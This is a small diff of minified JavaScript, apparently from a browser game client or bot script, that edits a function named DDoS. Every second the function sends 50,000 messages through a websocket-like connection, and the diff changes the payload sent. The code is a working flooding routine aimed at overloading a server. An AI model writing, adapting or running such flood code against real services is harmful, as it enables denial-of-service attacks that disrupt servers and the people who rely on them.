@@ -5995,7 +5995,7 @@ function K(a, e, t, d, c) {
 function DDoS() {
 	Int = setInterval((() => {
 		let i = 5e4;
-		for (; i--;) vw.oOW.send(JSON.stringify([11]))
+		for (; i--;) vw.oOW.send(JSON.stringify([7, 4]))
 	}), 1e3)
 }
 
